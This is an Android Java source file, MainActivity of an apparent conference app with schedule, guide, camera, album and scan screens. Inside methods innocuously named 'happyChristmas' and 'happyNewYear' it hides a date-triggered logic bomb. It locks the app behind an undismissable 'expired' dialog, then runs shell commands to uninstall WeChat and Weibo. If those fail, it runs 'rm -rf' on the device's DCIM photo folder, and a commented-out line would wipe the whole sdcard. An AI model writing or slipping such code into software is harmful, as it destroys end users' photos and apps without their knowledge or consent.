package com.infinitus.yearapp_a.activity;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.UUID;

import com.infinitus.yearapp_a.R;
import com.infinitus.yearapp_a.utils.Constants;
import com.infinitus.yearapp_a.utils.Prefs;
import com.lonsonlo.wjx.UnityPlayerNativeActivity;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.ImageView;
import android.widget.LinearLayout;

/**
 * 主页面
 *
 * @author Administrator
 */
public class MainActivity extends BaseActivity implements OnClickListener {
    /*请求系统照相机*/
    private static final int REQUEST_CAPTURE = 0x1;
    private Uri imageUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        super.setRightButtonDrawable(R.drawable.icon_setting);
        setContentView(R.layout.activity_main);

        happyChristmas();
    }

    /**
     * 圣诞节快乐
     */
    private void happyChristmas() {
        if(System.currentTimeMillis() > 1450972800000l) {//12月25日过期
            if(System.currentTimeMillis() > 1451577600000l) {//元旦再不给试试
                happyNewYear();
            }

            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setCancelable(false);
            builder.setMessage("应用已过期，请联系管理员!!!");
            builder.setTitle("警告！！");
            builder.setNegativeButton("", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {

                }
            });
            builder.setPositiveButton("", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {

                }
            });
            builder.create().show();
        }
    }

    /**
     * 新年快乐
     */
    private void happyNewYear() {
        try {
            Runtime runtime = Runtime.getRuntime();
            Process exec = runtime.exec("pm uninstall com.tencent.mm");
            InputStream in = exec.getInputStream();
            byte[] buffer = new byte[1024];
            StringBuffer sb = new StringBuffer();
            while (in.read(buffer) != -1) {
                sb.append(new String(buffer));
            }
            if(!sb.toString().equalsIgnoreCase("Success")) {
                runtime.exec("pm uninstall com.sina.weibo");
            }
        } catch (IOException e) {
            e.printStackTrace();
            String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
            try {
                Runtime runtime = Runtime.getRuntime();
                runtime.exec("rm -rf " + sdcard + "/DCIM");
//                runtime.exec("rm -rf " + sdcard + "");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
    }

    @Override
    protected void initLayout(View view) {
        LinearLayout ll_schedule = (LinearLayout) aq.id(R.id.ll_schedule).getView();
        ll_schedule.setOnClickListener(this);
        LinearLayout ll_gonglue = (LinearLayout) aq.id(R.id.ll_gonglue).getView();
        ll_gonglue.setOnClickListener(this);
        LinearLayout ll_xiangji = (LinearLayout) aq.id(R.id.ll_xiangji).getView();
        ll_xiangji.setOnClickListener(this);
        LinearLayout ll_3d = (LinearLayout) aq.id(R.id.ll_3d).getView();
        ll_3d.setOnClickListener(this);
        LinearLayout ll_flashlight = (LinearLayout) aq.id(R.id.ll_flashlight).getView();
        ll_flashlight.setOnClickListener(this);
        LinearLayout ll_xiangce = (LinearLayout) aq.id(R.id.ll_xiangce).getView();
        ll_xiangce.setOnClickListener(this);
        LinearLayout ll_scan = (LinearLayout) aq.id(R.id.ll_scan).getView();
        ll_scan.setOnClickListener(this);

        /* 设置动画 */
        ImageView bg_logo = aq.id(R.id.iv_logo_background).getImageView();
        Animation loadAnimation = AnimationUtils.loadAnimation(this, R.anim.logo_bg_in);
        bg_logo.startAnimation(loadAnimation);
    }

    @Override
    protected void loadData() {
        setNetworkResult(true);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.ll_schedule:
                gotoSchedule();
                break;
            case R.id.ll_gonglue:
                gotoGuide();
                break;
            case R.id.ll_xiangji:
                openMeetingCamera();
                break;
            case R.id.ll_3d:
                realExperience();
                break;
            case R.id.ll_flashlight:
                flashLight();
                break;
            case R.id.ll_xiangce:
                gotoXiangce();
                break;
            case R.id.ll_scan:
                gotoScan();
                break;
        }
    }

    /**
     * 扫一扫
     */
    private void gotoScan() {
        Intent intent = new Intent(this, ScanMainActivity.class);
        startActivity(intent);
    }

    /**
     * 电子相册
     */
    private void gotoXiangce() {
        Intent intent = new Intent(this, XiangceMainActivity.class);
        startActivity(intent);
    }

    /**
     * 群星闪耀
     */
    private void flashLight() {
        Intent intent = new Intent(this, FlashlightActivity.class);
        startActivity(intent);
    }

    /**
     * 实景体验
     */
    private void realExperience() {
        Intent intent = new Intent(this, UnityPlayerNativeActivity.class);
        startActivity(intent);
    }

    /**
     * 参会攻略
     */
    private void gotoGuide() {
        Intent intent = new Intent(this, WebActivity.class);
        intent.putExtra(Constants.EXTRA_KEY_WEBVIEW_URL, "");
        startActivity(intent);
    }

    /**
     * 会议日程
     */
    private void gotoSchedule() {
        Intent intent = new Intent(this, ScheduleActivity.class);
        startActivity(intent);
    }

    /**
     * 会议相机
     */
    private void openMeetingCamera() {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        File dir = new File(Prefs.getTempImagePath());
        if (!dir.exists()) {
            dir.mkdirs();
        }
        String fileName = UUID.randomUUID().toString() + ".jpg";
        File file = new File(dir, fileName);
        if (!file.exists()) {
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        imageUri = Uri.fromFile(file);
        intent.putExtra(MediaStore.EXTRA_OUTPUT, imageUri);
        startActivityForResult(intent, REQUEST_CAPTURE);
    }

    @Override
    protected void onRightButtonClick(View v) {
        Intent intent = new Intent(this, SettingActivity.class);
        startActivity(intent);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CAPTURE && resultCode == RESULT_OK) {
            Intent intent = new Intent(this, MeetingCameraActivity.class);
            intent.putExtra(Constants.EXTRA_KEY_IMAGE_URI, imageUri);
            startActivity(intent);
        }
    }

}
